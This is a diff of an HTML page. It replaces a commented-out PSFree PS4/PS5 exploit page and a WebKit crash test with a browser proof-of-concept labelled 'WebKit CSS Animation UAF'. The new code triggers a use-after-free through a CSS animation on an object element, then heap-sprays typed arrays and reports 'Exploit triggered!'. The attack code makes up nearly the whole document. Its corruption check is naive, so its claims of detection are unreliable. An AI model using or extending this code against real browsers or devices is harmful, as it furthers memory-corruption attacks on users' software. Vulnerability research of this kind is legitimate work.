@@ -1,129 +1,143 @@
-<!-- Copyright (C) 2023-2025 anonymous
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebKit CSS Animation UAF</title>
+    <style>
+      @keyframes keyframes {}
+      cite { animation: keyframes 100ms; }
+      button {
+        margin-top: 20px;
+        padding: 10px;
+        font-size: 16px;
+      }
+      #status {
+        margin-top: 10px;
+        font-weight: bold;
+      }
+      #console {
+        margin-top: 10px;
+        white-space: pre-wrap;
+        font-family: monospace;
+      }
+    </style>
+</head>
+<body>
+    <h1>WebKit CSS Animation UAF</h1>
+    <p>Click the button to trigger the PoC. (Browser may crash or show exploit messages)</p>
+    <button id="button">Trigger PoC</button>
+    <div id="status">Waiting...</div>
+    <pre id="console"></pre>
+    <object type="image/png" id="target-object">
+        <cite id="target-cite"></cite>
+        <dl id="target-dl" hidden></dl>
+    </object>
+    <p>PASS if this test doesn't crash</p>
+    <script type="module">
+        // Internal debug_log
+        function debug_log(message) {
+          const consoleDiv = document.getElementById('console');
+          consoleDiv.textContent += message + '\n';
+        }
 
-This file is part of PSFree.
+        const object = document.querySelector("#target-object");
+        const cite = document.querySelector("#target-cite");
+        const dl = document.querySelector("#target-dl");
+        const status = document.getElementById("status");
+        const DELAY = 100;
+        let attemptCount = 0;
 
-PSFree is free software: you can redistribute it and/or modify
-it under the terms of the GNU Affero General Public License as
-published by the Free Software Foundation, either version 3 of the
-License, or (at your option) any later version.
+        function heapSpray() {
+          let spray = [];
+          for (let i = 0; i < 10000; i++) {
+            let arr = new Uint8Array(0x1000);
+            for (let j = 0; j < arr.length; j++) {
+              arr[j] = 0x41;
+            }
+            spray.push(arr);
+          }
+          debug_log("Heap spray completed");
+          return spray;
+        }
 
-PSFree is distributed in the hope that it will be useful,
-but WITHOUT ANY WARRANTY; without even the implied warranty of
-MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-GNU Affero General Public License for more details.
+        function cleanDOM() {
+          const existingObject = document.querySelector('#target-object');
+          if (existingObject) {
+            debug_log('Removing existing object');
+            existingObject.remove();
+          }
+          const newObject = document.createElement('object');
+          newObject.type = 'image/png';
+          newObject.id = 'target-object';
+          const newCite = document.createElement('cite');
+          newCite.id = 'target-cite';
+          const newDl = document.createElement('dl');
+          newDl.id = 'target-dl';
+          newDl.hidden = true;
+          newObject.appendChild(newCite);
+          newObject.appendChild(newDl);
+          document.body.appendChild(newObject);
+          debug_log('Created new object, cite, and dl');
+          return {
+            object: newObject,
+            cite: newCite,
+            dl: newDl
+          };
+        }
 
-You should have received a copy of the GNU Affero General Public License
-along with this program.  If not, see <https://www.gnu.org/licenses/>.
+        function triggerUAF() {
+          const { object, cite, dl } = cleanDOM();
+          attemptCount++;
+          debug_log(`Attempt #${attemptCount}: Initiating exploit...`);
+          status.textContent = `Attempt #${attemptCount} in progress...`;
+          object.data = "x";
+          cite.style.animationIterationCount = "infinite";
+          setTimeout(() => {
+            try {
+              const animation = cite.getAnimations()[0];
+              if (!animation) {
+                debug_log("No animation found");
+                status.textContent = "Error: No animation";
+                return;
+              }
+              object.width = "1em";
+              object.codeBase;
+              animation.effect = new KeyframeEffect(dl, {});
+              const spray = heapSpray();
+              debug_log("UAF triggered, check for crash or memory corruption.");
+              status.textContent = "Exploit triggered!";
+              // Check for UAF
+              for (let i = 0; i < spray.length; i++) {
+                const arr = spray[i];
+                if (arr[0] !== 0x41) {
+                  debug_log(`UAF detected at spray index: ${i}`);
+                  status.textContent = "UAF detected!";
+                  break;
+                }
+              }
+            } catch (e) {
+              debug_log(`Error in triggerUAF: ${e.message}`);
+              status.textContent = "Error: Exploit failed.";
+            }
+          }, DELAY);
+        }
 
-<html>
-    <head>
-        <meta charset='utf-8'>
-        <title>PSFree-Lapse Exploit For 9.00</title>
-        <style>
-            @font-face {
-                font-family: 'logging';
-                src: url('fonts/LiberationMono-Regular.ttf');
-            }
-            #console {
-                font-family: 'logging';
-            }
-            .container {
-                overflow: hidden;
-                content-visibility: auto;
-                transform: translateZ(0);
-                position: relative;
-                width: 200px;
-                height: 200px;
-            }
-            .child {
-                width: 100px;
-                height: 100px;
-                position: absolute;
-                top: 0;
-                left: 0;
-                background: blue;
-                transform: translateZ(0);
-            }
-            button {
-                margin-top: 20px;
-                padding: 10px;
-                font-size: 16px;
-            }
-            #status {
-                margin-top: 10px;
-                font-weight: bold;
-            }
-        </style>
-    </head>
-    <body>
-        PSFree: A PS4/PS5 Exploit Chain<br>
-        Donation (Monero/XMR):<br>
-        86Fk3X9AE94EGKidzRbvyiVgGNYD3qZnuKNq1ZbsomFWXHYm6TtAgz9GNGitPWadkS3Wr9uXoT29U1SfdMtJ7QNKQpW1CVS<br>
-        See <a href='./about.html' data-jslicense='1'>JavaScript license information</a> for the
-        source code and license.<br>
-        <button id="button">Trigger Exploit</button>
-        <div id="status">Waiting...</div>
-        <div class="container">
-            <div class="child"></div>
-        </div>
-        <pre id='console'></pre>
-    </body>
-    <script src="payload.js"></script>
-    <script>
+        const observer = new MutationObserver((mutations) => {
+          debug_log("DOM tree modified, attempting UAF exploit...");
+          triggerUAF();
+        });
+
+        observer.observe(object, { attributes: true, childList: true, subtree: true });
+
         document.getElementById('button').addEventListener('click', () => {
-            const status = document.getElementById('status');
-            status.textContent = 'Loading exploit...';
-            // Dynamically load alert.mjs
-            import('./alert.mjs').then(module => {
-                status.textContent = 'Running exploit...';
-            }).catch(error => {
-                status.textContent = 'Error: Failed to load exploit.';
-                alert(`Failed to load alert.mjs: ${error.message}`);
-            });
+          try {
+            triggerUAF();
+          } catch (e) {
+            debug_log(`Error occurred: ${e.message}`);
+            status.textContent = "Error: Exploit failed.";
+          }
         });
     </script>
-</html> -->
-
-<html>
-<head>
-<style>
-
-@keyframes keyframes {}
-
-cite { animation: keyframes 100ms }
-
-</style>
-</head>
-<body onload="main()">
-
-<object type="image/png">
-    <cite></cite>
-    <dl hidden></dl>
-</object>
-
-<script>
-
-if (window.testRunner)
-    window.testRunner.dumpAsText();
-
-const object = document.querySelector("object");
-const cite = document.querySelector("cite");
-const dl = document.querySelector("dl");
-
-function main() {
-    object.addEventListener("DOMSubtreeModified", subtreeModified);
-    object.data = "x";
-    cite.style.animationIterationCount = "infinite";
-}
-
-function subtreeModified() {
-    const animation = cite.getAnimations()[0];
-    object.width = "1em";
-    object.codeBase;
-    animation.effect = new KeyframeEffect(dl, { });
-}
-
-</script>
-<p>PASS if this test doesn't crash</p>
 </body>
 </html>
